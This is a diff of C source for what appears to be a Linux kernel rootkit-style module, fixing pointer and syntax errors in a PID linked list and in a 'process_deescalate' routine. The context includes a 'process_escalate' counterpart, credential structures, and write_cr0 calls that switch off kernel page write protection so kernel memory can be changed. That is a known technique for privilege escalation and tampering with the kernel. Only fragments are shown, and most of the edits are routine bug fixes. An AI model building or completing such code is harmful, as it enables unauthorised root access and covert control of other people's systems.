@@ -4,9 +4,9 @@
 PID_NODE *head = NULL;
 
 /* insert node at the beginning of the current list */
-PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node){
+PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *node){
   printk("insert_pid_node()");
-  node = new_node;
+  // PID_NODE node = new_node;
   /* we are adding at the beginning, new head */
   node->prev = NULL;
   node->next = (*head); //old head
@@ -35,7 +35,7 @@ PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
 }
 
 /* delete node */
-void *delete_pid_node(PID_NODE **head, PID_NODE node){
+void delete_pid_node(PID_NODE **head, PID_NODE *node){
   /* check for NULL */
   printk("delete_pid_node()");
   if(*head == NULL || node == NULL) {
@@ -104,7 +104,8 @@ void process_escalate(pid_t pid){
 
 void process_deescalate(pid_t pid){
   struct task_struct *task;
-  PID_NODE node = find_pid_node(&head, pid);
+  PID_NODE *node = find_pid_node(&head, pid);
+  struct cred *pcred;
   if(node != NULL){
     rcu_read_lock(); //lock the mutex
     write_cr0(read_cr0() & (~0x10000)); //disable page protection
@@ -125,7 +126,7 @@ void process_deescalate(pid_t pid){
     write_cr0(read_cr0() | 0x10000); //enable page protection
     /*delete pid node from LL*/
     delete_pid_node(&head, node);
-    return
+    return;
   }
   printk("process %d not in list", pid);
 
